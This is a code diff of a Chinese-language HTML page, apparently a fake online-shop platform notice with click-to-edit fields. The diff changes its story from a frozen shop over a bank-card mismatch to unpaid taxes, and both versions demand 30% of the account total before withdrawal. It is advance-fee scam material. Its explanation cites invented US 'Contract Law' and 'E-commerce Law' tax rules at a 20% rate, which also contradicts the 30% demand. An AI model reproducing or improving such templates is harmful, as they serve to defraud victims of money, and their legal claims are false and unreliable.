@@ -196,6 +196,7 @@ body {
     <div>银行信息</div>
     <div>商户保证金</div>
     <div>异常情况</div>
+    <div>缴税审查</div>
 </div>
 
 <!-- 输入 -->
@@ -225,18 +226,18 @@ body {
 </div>
 
 <div class="row">
-<div class="label">提现银行卡</div>
-<div class="value" onclick="edit(this)">123456789</div>
+<div class="label">经营总额</div>
+<div class="value" onclick="edit(this)">$1000</div>
 </div>
 
 <div class="row">
-<div class="label">提现金额</div>
+<div class="label">应交税款</div>
 <div class="value" onclick="edit(this)">$1000</div>
 </div>
 
 <div class="row">
 <div class="label">审核状态</div>
-<div class="value red" onclick="edit(this)">银行信息与实名不符，提现失败</div>
+<div class="value red" onclick="edit(this)">税款未缴纳</div>
 </div>
 
 <!-- 汇率 -->
@@ -260,20 +261,20 @@ body {
 <!-- 右侧 -->
 <div class="right-box">
 
-<p>当前状态：<span class="red" onclick="edit(this)">店铺冻结</span>
+<p>当前状态：<span class="red" onclick="edit(this)">未缴税</span>
   
 <p>
 提现失败原因：
-<span class="red" onclick="edit(this)">提现银行卡与实名不符</span>
+<span class="red" onclick="edit(this)">税款未缴纳</span>
     
 </p>
 
 <p onclick="edit(this)">
-系统检测到：该商家提款银行卡与店铺实名不符，为了资金安全，账户已被保护性冻结！
+系统检测到：该商家税款未缴纳，提现失败，资金自动退回到商家账户！
 </p>
 
 <p onclick="edit(this)">
-解决办法：需要支付账户总金额30%的资金来解冻。
+解决办法：需要缴纳账户总金额30%的资金来验证缴税。
 </p>
 
 <p onclick="edit(this)">
@@ -286,7 +287,7 @@ body {
 
 <!-- 说明 -->
 <div style="background:#3c78b5;color:white;padding:24px;margin-top:10px;" onclick="edit(this)">
-    情况说明：为确保每一位成员在我们平台的资金安全，提现时系统会自动检测该账户的实名认证和提现银行卡是否保持一致，若银行卡与提现账户实名不符或者银行卡信息填写错误，系统会自动保护性冻结该店铺，届时需要店铺持有人缴纳账户的总资金30%进行验证解冻，激活提现功能。
+    情况说明：根据《美利坚合众国（美国）合同法》、《美利坚合众国（美国）电子商务法》及相关法律法规的规定需要缴纳个人所得税、电商增值税、进出口税务适用比例税收，税率为百分之二十，缴纳上报完成退税之后财务会将你的税务补贴到你的货款当中。，激活提现功能。
     
 </div>
 
